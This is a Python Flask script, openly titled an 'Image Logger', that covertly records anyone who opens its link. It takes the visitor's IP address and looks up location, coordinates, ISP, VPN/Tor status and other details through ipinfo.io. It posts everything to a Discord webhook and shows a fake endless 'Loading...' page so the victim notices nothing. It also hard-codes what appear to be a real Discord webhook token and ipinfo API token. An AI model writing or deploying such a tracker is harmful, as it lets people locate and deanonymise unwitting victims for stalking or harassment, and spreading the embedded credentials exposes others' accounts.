from flask import Flask, request, Response
import requests
import json

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1334821132876120099/Cih_JEF2oZ-SAqEv-WhGrgHH1CwLxNuEvEYU8GzNzkjPmRYga39V-ranJY9Rti1neiRs'
IPINFO_TOKEN = 'af34e1cc0c93a9'  # Your actual ipinfo.io token

def send_to_discord(info):
    data = {
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "description": "A User Opened the Original Image!",
                "color": 3447003,  # Blue color
                "fields": [
                    {"name": "IP Info", "value": info}
                ]
            }
        ]
    }
    headers = {"Content-Type": "application/json"}
    requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)

@app.route('/')
def log_ip_info():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip == '127.0.0.1':
        ip = requests.get('https://api.ipify.org').text  # Fallback to external service

    response = requests.get(f'https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}')
    data = response.json()

    info = f"""
    IP: {data.get('ip')}
    Provider: {data.get('org')}
    ASN: {data.get('asn', {}).get('asn')}
    Country: {data.get('country')}
    Region: {data.get('region')}
    City: {data.get('city')}
    Coords: {data.get('loc')} (Approximate)
    Geolocation Accuracy: {data.get('geo', {}).get('accuracy')}
    Timezone: {data.get('timezone')}
    Postal: {data.get('postal')}
    Carrier: {data.get('carrier')}
    Mobile: {data.get('mobile')}
    VPN: {data.get('privacy', {}).get('vpn')}
    Proxy: {data.get('privacy', {}).get('proxy')}
    Tor: {data.get('privacy', {}).get('tor')}
    Hosting: {data.get('privacy', {}).get('hosting')}
    Threat Level: {data.get('threat', {}).get('level')}
    Threat Type: {data.get('threat', {}).get('type')}
    ASN Name: {data.get('asn', {}).get('name')}
    ASN Domain: {data.get('asn', {}).get('domain')}
    ASN Route: {data.get('asn', {}).get('route')}
    Company Name: {data.get('company', {}).get('name')}
    Company Domain: {data.get('company', {}).get('domain')}
    Reverse DNS: {data.get('rdns', 'N/A')}
    Connection Type: {data.get('connection', {}).get('type', 'N/A')}
    Connection Speed: {data.get('connection', {}).get('speed', 'N/A')}
    Hostname: {data.get('hostname', 'N/A')}
    City Geoname ID: {data.get('city_geoname_id', 'N/A')}
    Metro Code: {data.get('metro', 'N/A')}
    IP Range: {data.get('range', 'N/A')}
    Autonomous System Organization: {data.get('asn_org', 'N/A')}
    Continent Code: {data.get('continent_code', 'N/A')}
    Average Income: {data.get('average_income', 'N/A')}
    Population Density: {data.get('population_density', 'N/A')}
    Climate: {data.get('climate', 'N/A')}
    ISP: {data.get('isp', 'N/A')}
    Domain: {data.get('domain', 'N/A')}
    Usage Type: {data.get('usage_type', 'N/A')}
    """

    print(info)
    send_to_discord(info)

    # Infinite loading response
    return Response("<html><head><title>Loading...</title></head><body><h1>Loading...</h1></body></html>", status=200, content_type='text/html')

if __name__ == '__main__':
    app.run(debug=True)
